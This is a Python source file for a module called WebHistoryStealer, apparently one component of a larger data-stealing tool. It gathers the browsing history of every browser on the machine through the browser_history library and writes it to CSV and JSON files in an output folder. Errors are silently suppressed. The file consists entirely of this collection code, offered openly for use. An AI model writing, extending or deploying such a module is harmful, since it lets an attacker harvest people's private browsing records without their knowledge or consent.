import os

from browser_history import get_history

from config import Constant
from config import ModuleManager


class WebHistoryStealer(ModuleManager):
    def __init__(self) -> None:
        super().__init__(module_name="WebHistoryStealer")
        
        self.browsers_folder = os.path.join(self.output_folder_user, 'browsers')
        self.output_filename_csv = os.path.join(self.browsers_folder, 'browser_history_all.csv')
        self.output_filename_json = os.path.join(self.browsers_folder, 'browser_history_all.json')
        
        if not os.path.isdir(self.browsers_folder):
            os.makedirs(self.browsers_folder)
    
    def run(self):
        outputs = get_history()
    
        if Constant.browser_history_csv:
            try:
                outputs.save(f'{self.output_filename_csv}')
            except:
                pass
    
        if Constant.browser_history_json:
            try:
                outputs.save(f'{self.output_filename_json}')
            except:
                pass
